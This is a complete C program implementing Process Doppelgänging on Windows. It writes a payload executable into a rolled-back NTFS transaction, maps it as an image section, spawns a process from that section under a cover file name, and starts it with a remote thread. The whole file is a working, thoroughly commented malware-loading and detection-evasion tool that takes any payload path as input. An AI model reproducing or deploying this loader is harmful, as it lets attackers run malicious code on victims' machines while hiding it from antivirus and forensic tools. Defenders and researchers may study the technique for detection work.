#include <Windows.h>
#include <stdio.h>
#include <ktmw32.h>
#include "header.h"

#pragma comment(lib, "KtmW32")

#define NTSUCCESS(status) (status == (NTSTATUS)0x00000000L)

// Custom system error printing function
void PrintError(const char* text)
{
	DWORD err = GetLastError();
	LPSTR buf = nullptr;

	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |     // Allocate a buffer, retrieve from system error message, ignore inserts
		FORMAT_MESSAGE_FROM_SYSTEM |         // Get the message from the system's message table
		FORMAT_MESSAGE_IGNORE_INSERTS,       // Do not include insert sequences in the message
		nullptr,                             // lpSource: Pointer to the source; use nullptr for system messages
		err,                                 // dwMessageId: The error code for which we want the message
		0,                                   // dwLanguageId: Use default language
		(LPSTR)&buf,                         // lpBuffer: Allocate a buffer to receive the formatted message
		0,                                   // nSize: Size of the buffer; 0 to use the allocated size
		nullptr);                            // Arguments: Pointer to additional arguments; nullptr if not needed

	if (buf) // strip trailing CR/LF
	{
		char* p = buf;
		while (*p && (*p != '\r') && (*p != '\n')) ++p;
		*p = '\0';
	}

	printf("%s (0x%lX: %s)\n", text, err, buf ? buf : "<unknown>");    // Print system error code with it's description
	LocalFree(buf);                          // hMem: Pointer to the memory to be freed; frees the allocated buffer from FormatMessage
}

// Declare a temporary buffer for process memory and a variable for NTSTATUS results
BYTE tempBuf[1000] = { 0 };
NTSTATUS status;

// Function pointers for the necessary NT system calls used in process creation and memory managemen
NtCreateSection_t pNtCreateSection = NULL;
NtQueryInformationProcess_t pNtQueryInformationProcess = NULL;
NtCreateProcessEx_t pNtCreateProcessEx = NULL;
RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx = NULL;
RtlInitUnicodeString_t pRtlInitUnicodeString = NULL;

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Usage: Doppelgang <payload path>");
		return 1;
	}

	// Specify a placeholder filename for the cover file, which is not intended to exist
	WCHAR coverFile[] = L"C:\\doppelgang.txt";

	// Define the path for a transacted file used to store payload data temporarily
	CHAR transactFile[] = "C:\\Users\\tmp.txt";

	// Get the path of the payload file from command-line arguments
	CHAR* payloadFile = argv[1];

	// Create or open a file for reading the payload data specified by the user
	HANDLE hFile = CreateFileA(
		payloadFile,              // lpFileName: The name of the file to be created or opened
		GENERIC_READ,             // dwDesiredAccess: Access level for the file (read-only in this case)
		FILE_SHARE_READ,          // dwShareMode: Allows other processes to read the file while it's open
		0,                        // lpSecurityAttributes: Security descriptor (NULL for default security)
		OPEN_EXISTING,            // dwCreationDisposition: Opens an existing file
		FILE_ATTRIBUTE_NORMAL,    // dwFlagsAndAttributes: File attributes (normal file)
		0                         // hTemplateFile: Handle to a template file (NULL when not needed)
	);

	// Retrieve the size of the opened file to determine how much data to read
	DWORD size = GetFileSize(
		hFile,        // hFile: Handle to the file for which the size is being queried
		0             // lpFileSizeHigh: Pointer to a variable to receive the high-order word of the file size (NULL for low-order word only)
	);
	// Allocate a region of virtual memory for storing the payload data read from the file
	LPVOID buf = VirtualAlloc(
		0,                    // lpAddress: Pointer to the starting address for the allocation (0 for system to determine)
		size,                 // dwSize: The size of the memory region to be allocated
		MEM_COMMIT,           // flAllocationType: Commit the memory for immediate use
		PAGE_READWRITE        // flProtect: Access protection (read and write access allowed)
	);

	// Read the contents of the opened file into the allocated memory buffer
	if (!ReadFile(
		hFile,       // hFile: Handle to the file from which data is read
		buf,         // lpBuffer: Pointer to the buffer that receives the data
		size,        // nNumberOfBytesToRead: The number of bytes to read from the file
		0,           // lpNumberOfBytesRead: Pointer to a variable that receives the number of bytes read (NULL to ignore)
		0            // lpOverlapped: Pointer to an OVERLAPPED structure for asynchronous operation (NULL for synchronous)
	)) {
		PrintError("Unable to read file");
		exit(0);
	}
	CloseHandle(hFile);   // Close the handle to the opened file to release system resources

	// Initialize a structure to hold the payload data and its size for further use
	payload_data payload;
	payload.size = size;
	payload.buf = (BYTE*)buf;   // Set the buffer pointer to the allocated memory for the payload

	// Retrieve a handle to the ntdll.dll module, which contains necessary NT system functions
	HINSTANCE hinstStub = GetModuleHandleA("ntdll.dll");   // lpModuleName: The name of the module for which to get the handle
	if (hinstStub)
	{
		// Retrieve the address of the NtCreateSection function from the ntdll.dll module
		pNtCreateSection = (NtCreateSection_t)GetProcAddress(
			hinstStub,                // hModule: Handle to the module (ntdll.dll) containing the function
			"NtCreateSection"         // lpProcName: Name of the function to retrieve the address of
		);
		if (!pNtCreateSection)
		{
			PrintError("Could not find NtCreateSection entry point in NTDLL.DLL");
			exit(0);
		}

		// Retrieve the address of the NtCreateProcessEx function from the ntdll.dll module
		pNtCreateProcessEx = (NtCreateProcessEx_t)GetProcAddress(
			hinstStub,                   // hModule: Handle to the module (ntdll.dll) containing the function
			"NtCreateProcessEx"          // lpProcName: Name of the function to retrieve the address of
		);
		if (!pNtCreateProcessEx)
		{
			PrintError("Could not find NtCreateProcessEx entry point in NTDLL.DLL");
			exit(0);
		}

		// Retrieve the address of the NtQueryInformationProcess function from the ntdll.dll module
		pNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(
			hinstStub,                       // hModule: Handle to the module (ntdll.dll) containing the function
			"NtQueryInformationProcess"      // lpProcName: Name of the function to retrieve the address of
		);
		if (!pNtQueryInformationProcess)
		{
			PrintError("Could not find NtQueryInformationProcess entry point in NTDLL.DLL");
			exit(0);
		}

		// Retrieve the address of the RtlCreateProcessParametersEx function from the ntdll.dll module
		pRtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t)GetProcAddress(
			hinstStub,                       // hModule: Handle to the module (ntdll.dll) containing the function
			"RtlCreateProcessParametersEx"   // lpProcName: Name of the function to retrieve the address of
		);
		if (!pRtlCreateProcessParametersEx)
		{
			PrintError("Could not find RtlCreateProcessParametersEx entry point in NTDLL.DLL");
			exit(0);
		}

		// Retrieve the address of the RtlInitUnicodeString function from the ntdll.dll module
		pRtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(
			hinstStub,                       // hModule: Handle to the module (ntdll.dll) containing the function
			"RtlInitUnicodeString"           // lpProcName: Name of the function to retrieve the address of
		);
		if (!pRtlInitUnicodeString)
		{
			PrintError("Could not find RtlInitUnicodeString entry point in NTDLL.DLL");
			exit(0);
		}
	}
	else
	{
		PrintError("Could not GetModuleHandle of NTDLL.DLL");
		exit(0);
	}

	// Create a transaction to manage file operations with the option to roll back changes if necessary
	HANDLE hTransaction = CreateTransaction(
		0,                          // lpTransactionAttributes: Security attributes for the transaction (NULL for default)
		0,                          // UOW: Unique identifier for the transaction (NULL for system-generated)
		TRANSACTION_DO_NOT_PROMOTE, // CreateOptions: Prevents promotion of the transaction to a higher isolation level
		0,                          // IsolationLevel: Isolation level to be used for the transaction (NULL for default)
		0,                          // IsolationFlags: Additional flags for the transaction (NULL for default)
		0,                          // Timeout: Time-out period for the transaction (NULL for no limit)
		0                           // Description: string describing the transaction (NULL if not needed)
	);
	if (hTransaction == INVALID_HANDLE_VALUE) {
		PrintError("Unable to create transaction");
		exit(0);
	}

	// Create a transacted file for storing the payload data temporarily
	HANDLE hTransactedFile = CreateFileTransactedA(
		transactFile,                 // lpFileName: Name of the transacted file to be created
		GENERIC_READ | GENERIC_WRITE, // dwDesiredAccess: Read and write access to the file
		0,                            // dwShareMode: No sharing, other processes cannot access the file
		0,                            // lpSecurityAttributes: Security descriptor (NULL for default)
		CREATE_ALWAYS,                // dwCreationDisposition: Create a new file, overwriting if it exists
		FILE_ATTRIBUTE_NORMAL,        // dwFlagsAndAttributes: Normal file attributes
		0,                            // hTemplateFile: Handle to a template file (NULL when not needed)
		hTransaction,                 // hTransaction handle for the file operations
		0,                            // pusMiniVersion: Reserved for future use (must be NULL)
		0                             // lpExtendedParameter: Pointer to an OVERLAPPED structure (NULL for synchronous)
	);
	if (hTransactedFile == INVALID_HANDLE_VALUE) {
		PrintError("Unable to create transacted file");
		exit(0);
	}

	// Write the payload data to the transacted file, allowing for rollback if the transaction is not committed
	if (!WriteFile(
		hTransactedFile,              // hFile: Handle to the transacted file where data will be written
		payload.buf,                  // lpBuffer: Pointer to the buffer containing the data to write
		payload.size,                 // nNumberOfBytesToWrite: Number of bytes to write from the buffer
		0,                            // lpNumberOfBytesWritten: Pointer to a variable that receives the number of bytes written (NULL to ignore)
		0                             // lpOverlapped: Pointer to an OVERLAPPED structure for asynchronous operation (NULL for synchronous)
	)) {
		PrintError("Unable to write to transacted file");
		exit(0);
	}

	// Create a memory section for the payload, allowing it to be executed within a newly created process
	HANDLE hSection;

	// Undocumented NtCreateSection function
	status = pNtCreateSection(
		&hSection,               // SectionHandle: Pointer to a variable that receives a handle to the section object
		SECTION_ALL_ACCESS,      // DesiredAccess: The access mask that specifies the requested access to the section object (full access)
		0,                       // ObjectAttributes: Pointer to the base virtual address of the view to unmap. This value can be any virtual address within the view
		0,                       // MaximumSize: The maximum size, in bytes, of the section. The actual size when backed by the paging file, or the maximum the file can be extended or mapped when backed by an ordinary file
		PAGE_READONLY,           // SectionPageProtection: Specifies the protection to place on each page in the section (read-only)
		SEC_IMAGE,               // AllocationAttributes: A bitmask of SEC_XXX flags that determines the allocation attributes of the section (executable)
		hTransactedFile          // FileHandle (optional): Specifies a handle for an open file object. If the value of FileHandle is NULL, the section is backed by the paging file. Otherwise, the section is backed by the specified file
	);
	if (!NTSUCCESS(status)) {
		PrintError("NtCreateSection failed");
	}

	// Roll back the transaction to discard any changes made to the transacted file
	RollbackTransaction(hTransaction);

	// Close the handles for the transacted file and the transaction to release system resources
	CloseHandle(hTransactedFile);  // Close the handle to the transacted file
	CloseHandle(hTransaction);     // Close the handle to the transaction

	// Create a new process using the previously created memory section, allowing it to execute the payload
	HANDLE hProcess;

	// Undocumented NtCreateProcessEx function
	status = pNtCreateProcessEx(
		&hProcess,                 // ProcessHandle: A pointer to a handle that receives the process object handle
		PROCESS_ALL_ACCESS,        // DesiredAccess: The access rights desired for the process object (full access)
		0,                         // ObjectAttributes: A pointer to an OBJECT_ATTRIBUTES structure that specifies the attributes of the new process
		GetCurrentProcess(),       // ParentProcess: A handle to the parent process
		PS_INHERIT_HANDLES,        // Flags: Flags that control the creation of the process. These flags are defined as PROCESS_CREATE_FLAGS_* (Inherit handles from the parent process)
		hSection,                  // SectionHandle: A handle to a section object to be used for the new process
		0,                         // DebugPort: A handle to a debug port to be used for the new process
		0,                         // ExceptionPort: A handle to an access token to be used for the new process
		0                          // InJob: Reserved for future use, Must be zero
	);
	if (!NTSUCCESS(status)) {
		PrintError("NtCreateProcessEx failed");
		exit(0);
	}

	// Locate the entry point of the payload within the newly created process
	// Access the Process Environment Block (PEB) to find the base address of the module
	// Calculate the entry point address by adding the module's base address to the Relative Virtual Address (RVA)
	IMAGE_DOS_HEADER* pDOSHdr = (IMAGE_DOS_HEADER*)payload.buf;                             // Pointer to the DOS header
	IMAGE_NT_HEADERS64* pNTHdr = (IMAGE_NT_HEADERS64*)(payload.buf + pDOSHdr->e_lfanew);    // Pointer to the NT headers
	DWORD64 entryPointRVA = pNTHdr->OptionalHeader.AddressOfEntryPoint;                     // Retrieve the RVA of the entry point

	// Query basic information about the newly created process to obtain the Process Environment Block (PEB) location
	PROCESS_BASIC_INFORMATION pbi;   // Structure to hold process information
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0);   // Retrieve process basic information
	ReadProcessMemory(hProcess, pbi.PebBaseAddress, &tempBuf, sizeof(PEB), 0);   // Read the PEB from the newly created process
	DWORD64 baseAddr = (DWORD64)((PPEB)tempBuf)->ImageBaseAddress;   // Extract the base address from the PEB

	DWORD64 entryPoint = baseAddr + entryPointRVA;   // Calculate the final entry point address for execution


	// Initialize the Process Parameters block for the new process
	// Allocate memory in the newly created process to hold the Process Parameters block
	UNICODE_STRING uStr = { 0 };   // Create an uninitialized UNICODE_STRING structure
	pRtlInitUnicodeString(&uStr, coverFile);    // Initialize the UNICODE_STRING with the path to the cover file

	// Create the Process Parameters block required for the new process's execution environment
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;    // Pointer to hold the Process Parameters structure
	
	// Undocumented RtlCreateProcessParametersEx function
	status = pRtlCreateProcessParametersEx(
		&ProcessParameters,                  // ProcessParameters: Pointer to receive the Process Parameters structure
		&uStr,                               // ImagePath: Pointer to the UNICODE_STRING for the executable image path
		0,                                   // DllPath: Pointer to the directory containing the DLLs
		0,                                   // CurrentDirectory: Pointer to the current directory
		&uStr,                               // CommandLine: Pointer to the UNICODE_STRING for the command line
		0,                                   // Environment: Pointer to the environment block
		0,                                   // WindowTitle: Pointer to the window title
		0,                                   // DesktopInfo: Pointer to the desktop name
		0,                                   // ShellInfo: Pointer to shell information
		0,                                   // RuntimeData: Pointer to runtime data
		RTL_USER_PROC_PARAMS_NORMALIZED      // Flags: Indicates that the parameters are normalized
	);
	if (!NTSUCCESS(status)) {
		PrintError("RtlCreateProcessParametersEx failed");
		exit(0);
	}

	// Calculate the total size needed for the Process Parameters block, including the environment size
	DWORD procSize = ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength;   // Total size for allocation
	LPVOID MemoryPtr = ProcessParameters;   // Initialize a pointer to the Process Parameters structure
	
	// Allocate memory in the new process for the Process Parameters block
	MemoryPtr = VirtualAllocEx(
		hProcess,                         // hProcess: Handle to the target process for memory allocation
		MemoryPtr,                        // lpAddress: Pointer to the desired starting address (NULL for system to choose)
		procSize,                         // dwSize: Size of the memory to allocate
		MEM_RESERVE | MEM_COMMIT,         // flAllocationType: Reserve and commit the memory
		PAGE_READWRITE                    // flProtect: Memory protection (read and write access allowed)
	);

	// Write the Process Parameters block to the newly allocated memory in the new process
	if (!WriteProcessMemory(
		hProcess,                         // hProcess: Handle to the target process where memory will be written
		ProcessParameters,                // lpBaseAddress: Pointer to the base address in the target process where data will be written
		ProcessParameters,                // lpBuffer: Pointer to the buffer that contains the data to write
		procSize,                         // dwSize: Number of bytes to write from the buffer
		0                                 // lpNumberOfBytesWritten: Pointer to a variable that receives the number of bytes written (NULL to ignore)
	)) {
		PrintError("Unable to update process parameters");
		exit(0);
	}


	// Update the Process Environment Block (PEB) of the new process with the address of the Process Parameters block
	PPEB peb = (PPEB)pbi.PebBaseAddress;

	// Write the address of the new Process Parameters block to the Process Environment Block (PEB) of the new process
	if (!WriteProcessMemory(
		hProcess,                         // hProcess: Handle to the target process where memory will be written
		&peb->ProcessParameters,          // lpBaseAddress: Address in the PEB to update with the new Process Parameters
		&ProcessParameters,               // lpBuffer: Pointer to the new Process Parameters block
		sizeof(DWORD64),                  // dwSize: Number of bytes to write (size of a pointer)
		0                                 // lpNumberOfBytesWritten: Pointer to a variable receiving the number of bytes written (NULL to ignore)
	)) {
		PrintError("Unable to update PEB");
		exit(0);
	}


	// Create the main thread in the new process, starting at the calculated entry point
	HANDLE hThread = CreateRemoteThread(
		hProcess,                           // hProcess: Handle to the target process where the thread will be created
		0,                                  // lpThreadAttributes: Pointer to security attributes (NULL for default)
		0,                                  // dwStackSize: Initial stack size (0 for default)
		(LPTHREAD_START_ROUTINE)entryPoint, // lpStartAddress: Pointer to the entry point of the thread (where execution begins)
		0,                                  // lpParameter: Parameter to the thread function (NULL for no parameter)
		0,                                  // dwCreationFlags: Thread creation flags (0 for default behavior)
		0                                   // lpThreadId: Pointer to receive the thread identifier (NULL to ignore)
	);
	if (!hThread) {
		PrintError("Unable to create remote thread");
		exit(0);
	}

	// Close handles to free resources and prevent memory leaks
	CloseHandle(hSection);   // Close the handle to the memory section
	CloseHandle(hProcess);   // Close the handle to the newly created process
	CloseHandle(hThread);    // Close the handle to the thread created in the new process

	// Release the allocated memory for the payload buffer
	VirtualFree(payload.buf, 0, MEM_RELEASE); // Free the memory allocated for the payload

	return 0;
}
